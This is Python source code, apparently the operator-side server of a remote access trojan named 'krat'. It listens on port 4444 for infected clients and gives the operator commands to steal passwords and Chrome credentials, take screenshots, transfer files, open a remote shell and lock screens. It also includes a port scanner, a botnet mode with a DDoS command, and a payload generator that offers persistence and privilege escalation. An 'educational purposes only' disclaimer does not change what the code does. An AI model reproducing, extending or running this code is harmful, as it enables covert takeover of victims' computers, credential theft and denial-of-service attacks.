6000:'X11',6001:'X11:1',6002:'X11:2',6003:'X11:3',6004:'X11:4',6005:'X11:5',6006:'X11:6',6007:'X11:7',6008:'X11:8',6009:'X11:9',6017:'xmail-ctrl',6050:'arcserve',6101:'VeritasBackupExec',6103:'RETS-or-BackupExec',6105:'isdninfo',6106:'isdninfo',6110:'softcm',6111:'spc',6112:'dtspc',6141:'meta-corp',6142:'aspentec-lm',6143:'watershed-lm',6144:'statsci1-lm',6145:'statsci2-lm',6146:'lonewolf-lm',6147:'montage-lm',6148:'ricardo-lm',6346:'gnutella',6400:'crystalreports',6401:'crystalenterprise',6543:'mythtv',6544:'mythtv',6547:'PowerChutePLUS',6548:'PowerChutePLUS',6502:'netop-rc',6558:'xdsxdm',6588:'analogx',6666:'irc-serv',6667:'irc',6668:'irc',6969:'acmsoda',6699:'napster',7000:'afs3-fileserver',7001:'afs3-callback',7002:'afs3-prserver',7003:'afs3-vlserver',7004:'afs3-kaserver',7005:'afs3-volser',7006:'afs3-errors',7007:'afs3-bos',7008:'afs3-update',7009:'afs3-rmtsys',7010:'ups-onlinet',7070:'realserver',7100:'font-service',7200:'fodms',7201:'dlip',7273:'openmanage',7326:'icb',7464:'pythonds',7597:'qaz',7937:'nsrexecd',7938:'lgtomapper',8000:'http-alt',8007:'ajp12',8009:'ajp13',8021:'ftp-proxy',8080:'http-proxy',8081:'blackice-icecap',8082:'blackice-alerts',8443:'https-alt',8888:'sun-answerbook',8892:'seosload',9090:'zeus-admin',9100:'jetdirect',9111:'DragonIDSConsole',9152:'ms-sql2000',9535:'man',9876:'sd',9991:'issa',9992:'issc',9999:'abyss',10000:'snet-sensor-mgmt',10005:'stel',10082:'amandaidx',10083:'amidxtape',11371:'pksd',12000:'cce4x',12345:'NetBus',12346:'NetBus',13701:'VeritasNetbackup',13702:'VeritasNetbackup',13705:'VeritasNetbackup',13706:'VeritasNetbackup',13708:'VeritasNetbackup',13709:'VeritasNetbackup',13710:'VeritasNetbackup',13711:'VeritasNetbackup',13712:'VeritasNetbackup',13713:'VeritasNetbackup',13714:'VeritasNetbackup',13715:'VeritasNetbackup',13716:'VeritasNetbackup',13717:'VeritasNetbackup',
13718:'VeritasNetbackup',13720:'VeritasNetbackup',13721:'VeritasNetbackup',13722:'VeritasNetbackup',13782:'VeritasNetbackup',13783:'VeritasNetbackup',15126:'swgps',16959:'subseven',17007:'isode-dua',17300:'kuang2',18000:'biimenu',18181:'opsec_cvp',18182:'opsec_ufp',18183:'opsec_sam',18184:'opsec_lea',18185:'opsec_omi',18187:'opsec_ela',19150:'gkrellmd',20005:'btx',22273:'wnn6',22289:'wnn6_Cn',22305:'wnn6_Kr',22321:'wnn6_Tw',22370:'hpnpd',26208:'wnn6_DS',27000:'flexlm0',27001:'flexlm1',27002:'flexlm2',27003:'flexlm3',27004:'flexlm4',27005:'flexlm5',27006:'flexlm6',27007:'flexlm7',27008:'flexlm8',27009:'flexlm9',27010:'flexlm10',27374:'subseven',27665:'Trinoo_Master',31337:'Elite',32770:'sometimes-rpc3',32771:'sometimes-rpc5',32772:'sometimes-rpc7',32773:'sometimes-rpc9',32774:'sometimes-rpc11',32775:'sometimes-rpc13',32776:'sometimes-rpc15',32777:'sometimes-rpc17',32778:'sometimes-rpc19',32779:'sometimes-rpc21',32780:'sometimes-rpc23',32786:'sometimes-rpc25',32787:'sometimes-rpc27',44334:'tinyfw',44442:'coldfusion-auth',44443:'coldfusion-auth',47557:'dbbrowse',49400:'compaqdiag',54320:'bo2k'}
    try:
        return service_list[port]
    except:
        return "unknown"
#color
class colors:
    '''Colors class:
    reset all colors with colors.reset
    two subclasses fg for foreground and bg for background.
    use as colors.subclass.colorname.
    i.e. colors.fg.red or colors.bg.green
    also, the generic bold, disable, underline, reverse, strikethrough,
    and invisible work with the main class
    i.e. colors.bold
    '''
    reset='\033[0m'
    bold='\033[01m'
    disable='\033[02m'
    underline='\033[04m'
    reverse='\033[07m'
    strikethrough='\033[09m'
    invisible='\033[08m'
    class fg:
        black='\033[30m'
        red='\033[31m'
        green='\033[32m'
        orange='\033[33m'
        blue='\033[34m'
        purple='\033[35m'
        cyan='\033[36m'
        lightgrey='\033[37m'
        darkgrey='\033[90m'
        lightred='\033[91m'
        lightgreen='\033[92m'
        yellow='\033[93m'
        lightblue='\033[94m'
        pink='\033[95m'
        lightcyan='\033[96m'
    class bg:
        black='\033[40m'
        red='\033[41m'
        green='\033[42m'
        orange='\033[43m'
        blue='\033[44m'
        purple='\033[45m'
        cyan='\033[46m'
        lightgrey='\033[47m'
#MAIN COLORS
cyan = "\033[1;36;40m"
reset = "\033[1;37;40m"
red = "\033[1;31;40m"
green = "\033[1;32;40m"
yellow = "\033[1;33;40m"
#prompt
import argparse
import json
import readline
import socket
import sys
import threading

class ClientConnection():
    def __init__(self, conn, addr, uid=0):
        self.conn  = conn
        self.addr  = addr
        self.uid   = uid

class Server(threading.Thread):
    clients      = {}
    os = {}
    hostnames = {}
    client_count = 1
    bash = False
    current_client = None
    botnet = False
    
    def __init__(self, port):
        super(Server, self).__init__()
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.s.bind(('0.0.0.0', port))
        self.s.listen(5)

    def run(self):
        while True:
            conn, addr = self.s.accept()
#            dhkey = diffiehellman(conn)
            client_id = self.client_count
            
            
#            prompt()
            client = ClientConnection(conn, addr, uid=client_id)
            while True:
                try:
                    dat =  client.conn.recv(1024)
#                    print("Data Received: "+dat.decode('utf-8'))
                    if END_OF_STRING in dat.decode('utf-8'):
                        tmp = dat.decode('utf-8').replace(END_OF_STRING, "")
                        info = tmp.split(" ")
                        os = info[0]
                        hostname = info[1]
                        ip = info[2]
#                        print("\n"+str(addr)+" -> "+str(get_lan_ip())+":4444\n")
                        print("\n"+colors.fg.yellow+ip+colors.reset+" ["+colors.fg.lightblue+hostname+colors.reset+"] → "+colors.fg.yellow+get_lan_ip()+colors.reset+":4444")
                        print("["+colors.fg.cyan+"krat"+colors.reset+"]: ")
#                        print("OS: "+info[0]+", Hostname: "+hostname)
                        self.os[client_id] = info[0]
                        self.hostnames[client_id] = info[1]
                        break
                except Exception as e:
                    print('Error: {}'.format(e))
            self.clients[client_id] = client
            self.client_count += 1
    
    def send_client(self, cmd, client):
        try:
            
            client.conn.send(cmd.encode('utf-8'))
        except Exception as e:
            print('Error: {}'.format(e))

    def recv_client(self):
        try:
            recv_data = self.current_client.conn.recv(1024)
#            recv_data = decrypt(recv_data, client.dhkey)
#            recv_data = json.loads(recv_data)
#            recv_data = recv_data['results']
            print(recv_data.decode('utf-8'))
            if END_OF_STRING in recv_data.decode('utf-8'):
                print("End of string")
                after = (recv_data.decode('utf-8')).replace(END_OF_STRING, "")
                print(after)
        except Exception as e:
            print('Error: {}'.format(e))

    def select_client(self, client_id):
        try:
            self.current_client = self.clients[int(client_id)]
            print(colors.fg.cyan+'i '+colors.reset+'Client {} selected.'.format(client_id))
            c = "connected!"
            self.current_client.conn.send(c.encode('utf-8'))
        except (KeyError, ValueError):
            print('Error: Invalid Client ID.')
    def wait_survey(self):
        print(colors.fg.cyan+'i '+colors.reset+'One moment.')
        while True:
            try:
                recv_data = self.current_client.conn.recv(1024)
#            recv_data = decrypt(recv_data, client.dhkey)
#            recv_data = json.loads(recv_data)
#            recv_data = recv_data['results']
#                print(recv_data.decode('utf-8'))
                if END_OF_STRING in recv_data.decode('utf-8'):
#                    print("End of string")
                    after = (recv_data.decode('utf-8')).replace(END_OF_STRING, "")
                    tmp = after.replace("b'", "")
                    tmp2 = tmp.replace("\\n'", "")
                    print(tmp2)
                    break
            except Exception as e:
                print('Error: {}'.format(e))
                break
    def remove_client(self, key):
        return self.clients.pop(key, None)

    def kill_client(self):
        self.send_client('kill', self.current_client)
        self.current_client.conn.close()
        self.remove_client(self.current_client.uid)
        self.current_client = None

    def selfdestruct_client(self, _):
        self.send_client('selfdestruct', '', self.current_client)
        self.current_client.conn.close()
        self.remove_client(self.current_client.uid)
        self.current_client = None

    def get_clients(self):
        return [v for _, v in self.clients.items()]

    def list_clients(self):
        print('ID | Client Address     | OS             | Hostname\n---------------------------------------------------')
        for k, v in self.clients.items():
            print('{:>2} | {}\t| {}\t | {}'.format(k, v.addr[0], self.os[k], self.hostnames[k].replace(".local", "")))

    def quit_server(self, _):
        if input('Exit the server and keep all clients alive (y/N)? ').startswith('y'):
            for c in self.get_clients():
                self.send_client('quit', '', c)
            self.s.shutdown(socket.SHUT_RDWR)
            self.s.close()
            sys.exit(0)

    def goodbye_server(self, _):
        if input('Exit the server and selfdestruct all clients (y/N)? ').startswith('y'):
            for c in self.get_clients():
                self.send_client('selfdestruct', '', c)
            self.s.shutdown(socket.SHUT_RDWR)
            self.s.close()
            sys.exit(0)


server = Server(4444) #start server with port 4444

#MAIN SEND FUNCTIONS
def Send(cmd):
    current = server.current_client
    server.send_client(cmd, server.current_client)
def info():
    print(cyan+"i"+reset+" type 'help' to view available commands\n")
def printOnConsole(string):
    # Remove END_OF_STRING
    if END_OF_STRING in string:
        string = string.replace(END_OF_STRING, '')
    print(string)
# scanning functions
def ping(host):
    #ping parameters depending on OS
    parameters = "-n 1 -w 3 -i 0.2" if system_name().lower()=="windows" else "-c 1"
    #the ping command itself
    return system_call("ping " + parameters + " " + host + ">NUL") == 0


def prompt():
    command = input("[krat]: ")
    if command == "help" or command == "?" or command == "Help":
        print("Available Commmands")
        print(" - help")
        print(" - clients")
        print(" - connect [id]")
        print(" - generate")
        print(" - botnet")
        print(" - scan [target]")
    elif command == "exit" or command == "quit":
        print("\nExiting...")
        sys.exit(0)
    elif command == "clients":
        
        server.list_clients()
    elif "connect" in command:
        clid = command.split(" ")[1]
        server.select_client(clid)
   
        
#        print(cyan+"i"+reset+" \n")
   
    else:
#        ✔
        print(colors.fg.red+"[X] "+colors.reset+"Command not found")
    prompt()
def main():
    print(colors.fg.cyan+'i'+colors.reset+' Listening for connections on port '+colors.fg.cyan+'4444'+colors.reset)
    
    server.setDaemon(True)
    server.start()
#    prompt()
    while True:
        if server.current_client:
            ccid = server.current_client.uid
        else:
            ccid = '?'
        
        # allow noop
        
        if server.current_client and server.bash == False:
            prompt = input("["+colors.fg.cyan+"krat"+colors.reset+"/\033[01m\033[91minteract\033[0m] ")
            #            has a client
            command = prompt
            if command == "help" or command == "?" or command == "Help":
                print("Available Commmands")
                print(" - help\t\t\tshow this menu")
                print(" - disconnect\t\tdisconnect from host")
                print(" - askpass\t\tattempt to get password")
                print(" - chromedump\t\tattempt to get chrome passwords(WIN)")
                print(" - selfdestruct\t\tdestroy krat on remote host")
                print(" - survey\t\tsurvey host")
                print(" - message [msg]\tsend message")
                print(" - shell\t\tenter shell")
                print(" - cd [dir]\t\tcd to directory")
                print(" - lockscreen")
                print(" - download [file]")
                print(" - upload [file]")
                print(" - screenshot")
            elif command == "disconnect":
                server.kill_client()
                print(colors.fg.cyan+'i'+colors.reset+' Client Disconnected'+colors.reset)
            elif command == "askpass":
                Send("askpass")
                dat = server.recv_client()
            elif command == "screenshot":
                print(colors.fg.cyan+'i'+colors.reset+" Taking screenshot")
                Send(command)
                now = datetime.datetime.now()
                fileName = now.isoformat()+".jpg"
                while True:
                    l = server.current_client.conn.recv(1024)
                    l = l.decode('utf-8')
                    if l.startswith("File not found"):
                        print(l)
                        break

                    f = open("screenshots/"+fileName, 'w')
                    print(colors.fg.cyan+'i'+colors.reset+" Screenshot taken, downloading")
                    while (l):
#                        print("Decoded Data: "+l)
                        if str(END_OF_FILE) in str(l):
#                            print("END OF FILE DETECTED")
                            # removing END_OF_FILE flag
                            l = str(l).replace(str(END_OF_FILE), "")
                            l = str(l).replace("\\n", "\n")
                            f.write(str(l))
                            break
                        else:
                            f.write(str(l))
                            l = server.current_client.conn.recv(1024)

                    print(colors.fg.cyan+'i'+colors.reset+" Download complete. Saved to krat/screenshots folder")
                    # closing file
                    f.close()
                    break
                
            elif command.startswith("download ") == True:
                
                # transferring data from Server > Client

                # send command (ex: :download a.txt)
                # tell server that the file is coming
                Send(command)

                # set file name
                fileName = command[9:]

                # Begin downloading
                while True:
                    l = server.current_client.conn.recv(1024)
                    l = l.decode('utf-8')
                    if l.startswith("File not found"):
                        print(l)
                        break

                    f = open("downloads/"+fileName, 'w')
                    print(colors.fg.cyan+'i'+colors.reset+" Beginning Download")
                    while (l):
#                        print("Decoded Data: "+l)
                        if str(END_OF_FILE) in str(l):
#                            print("END OF FILE DETECTED")
                            # removing END_OF_FILE flag
                            l = str(l).replace(str(END_OF_FILE), "")
                            l = str(l).replace("\\n", "\n")
                            f.write(str(l))
                            break
                        else:
                            f.write(str(l))
                            l = server.current_client.conn.recv(1024)

                    print(colors.fg.cyan+'i'+colors.reset+" Download complete. Saved to krat/downloads folder")
                    # closing file
                    f.close()
                    break

					
            elif command == "lockscreen":
                Send("lockscreen")
            elif "message" in command:
                Send(command)
                print(colors.fg.cyan+'i'+colors.reset+" Message Sent")
            elif command == "message":
                print(colors.fg.lightred+'X'+colors.reset+" SyntaxError: Enter message after command")
            elif command == "chromedump":
                Send('chromedump')
                dat = server.recv_client()
            elif "cd" in command:
                Send(command)
            elif command == "ls":
                Send(command)
            elif command == "clear":
                os.system('clear')
            elif command == "survey":
#                print("\033[36mi\033[0m One moment..")
                Send("survey")
                server.wait_survey()
            elif command == "shell":
                print(colors.fg.cyan+'i'+colors.reset+" Entered shell, to exit type 'exit'")
                server.bash = True
                Send("bash_true")
#                Send("whoami")
            if not prompt:
                continue
        elif server.bash == True:

#            in bash session
            data = (server.current_client.conn.recv(1024).decode('utf-8')).replace(END_OF_STRING, "")
            dat2 = data.replace('b', '')
            dat3 = dat2.replace("'", '')
#            dat4 = dat3.replace("\\n", '')
            toReformat = dat3.split(END_OF_STRING)
#            while i < len(toReformat):
#                print(toReformat+"\n")
                
            cmd = input(dat3.replace(END_OF_STRING, "\n"))
            if cmd == "exit":
                server.bash = False
                Send("exit")
                print("\033[36mi\033[0m Terminated Bash")
            elif cmd == "clear":
                os.system('clear')
            else:
                Send(cmd)
            
        elif server.botnet == True:
            prompt = input("["+colors.fg.cyan+"krat"+colors.reset+"/\033[01m\033[91mbotnet\033[0m] ")
            command = prompt
            if command == "help":
                print("Available Commands")
                print(" - ddos [url]")
#                print(" - ddos [url]")
        else:
            prompt = input("["+colors.fg.cyan+"krat"+colors.reset+"]: ")
            command = prompt
            if not prompt:
                continue
#            no current client
            if command == "help" or command == "?" or command == "Help":
                print("Available Commmands")
                print(" - help")
                print(" - clients")
                print(" - connect [id]")
                print(" - generate")
                print(" - scan [host]")
            elif command == "exit" or command == "quit":
                print("\nExiting...")
                sys.exit(0)
            elif command == "clients":
        
                server.list_clients()
            elif "scan" in command:     
                print(colors.fg.cyan+"i"+colors.reset+" Verifying Target")
                if ping(command.split(" ")[1]):
                    ipaddr = command.split(" ")[1]
                    print(colors.fg.cyan+"i"+colors.reset+" Host is reachable")
                    for val, i in enumerate(common_port_list):
                        import socket
                        ssk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        ssk.settimeout(0.1)
                        result = ssk.connect_ex((ipaddr, i))
                        if (result == 0):
                            import socket
                            socket.setdefaulttimeout(2)
                            socky = socket.socket()
                            socky.connect((command.split(" ")[1], i))
                            banner = socky.recv(1024)
                            socky.close()
                            print(colors.fg.cyan+"i\t"+colors.reset+service(i)+" ("+str(i)+") is open ("+banner+")")
                else:
                    print(colors.fg.red+"[X] "+colors.reset+"Host is not reachable")
            elif command == "botnet":
                
                    
                    
                print(colors.fg.cyan+'i'+colors.reset+' Starting Botnet..')
        
                print(colors.fg.lightred+colors.bold+'!'+colors.reset+' Note: botnets are illegal if used on a computer you do not own. This program is for educational purposes only, and we are not responsible for anything you may do with it. Do you agree? [Y/n]')
                res = input(colors.fg.lightred+colors.bold+">> "+colors.reset)
                if res == "n" or res == "N" or res == "no":
                    print("Exiting botnet..")
                    server.botnet = False
                else:
                    
                    if len(server.clients) == 0:
                        print(colors.fg.lightred+colors.bold+'!'+colors.reset+' No clients are connected')
                    else:
                        server.botnet = True
                        os.system("clear")
                    
                        print(colors.fg.lightred+colors.bold+'!'+colors.reset+' Any commands run within the botnet menu will run across all connected devices')
            elif command == "generate":
                print("\033[36mi\033[0m Preparing environment..")
                os.system('clear')
#                ask for config
                host = input(colors.fg.yellow+"? "+colors.reset+"LHOST (Leave blank for "+get_lan_ip()+"): ")
                persis = input(colors.fg.yellow+"? "+colors.reset+"Enable Persistence [y/N] ")
                priv = input(colors.fg.yellow+"? "+colors.reset+"Attempt to gain root [y/N] ")
                print("\033[36mi\033[0m Setting Variables..")
                config = open("payloads/payload.py", "r")
#            show config settings
                if persis == "y" or persis == "Y":
                    print("\n\tpersistence ["+colors.fg.green+colors.bold+"enabled"+colors.reset+"]")
#                    per = (config.read()).replace("3908mfoaisdaaweq2412eas", "true")
                else:
                    print("\n\tpersistence ["+colors.fg.red+colors.bold+"disabled"+colors.reset+"]")
#                    per_fal = (config.read()).replace("3908mfoaisdaaweq2412eas", "false")
                if priv == "y" or priv == "Y":
                    print("\tpriv_escal ["+colors.fg.green+colors.bold+"enabled"+colors.reset+"]\n")
#                    pri = (config.read()).replace("alfoeinosfdsfkslde", "true")
                else:
                    print("\tpriv_escal ["+colors.fg.red+colors.bold+"disabled"+colors.reset+"]\n")
#                    pri_fal = (config.read()).replace("alfoeinosfdsfkslde", "false")
#                print("\npersistence [")
#                save file
                if host == "":
                    host = get_lan_ip()
                
               
                
                mainSTR = (config.read()).replace("jasldisdaiwomiadoasd", host)
                print("\n\033[36mi\033[0m Saving Payload (payloads/"+get_lan_ip()+"_payload.py)..")
                Dir = os.getcwd()+"payloads/"
                f= open("payloads/"+get_lan_ip()+"_payload.py","w+")
                f.write(mainSTR)
                f.close()
#                dat = server.recv_client()
            elif "connect" in command:
                clid = command[-1:]
                server.select_client(clid)
                Send("Ready to recieve Commands"+END_OF_STRING)
#                Send("survey")
            
            else:
#        ✔
                print(colors.fg.red+"[X] "+colors.reset+"Command not found")
if __name__ == '__main__':
    os.system('clear')
    main()
    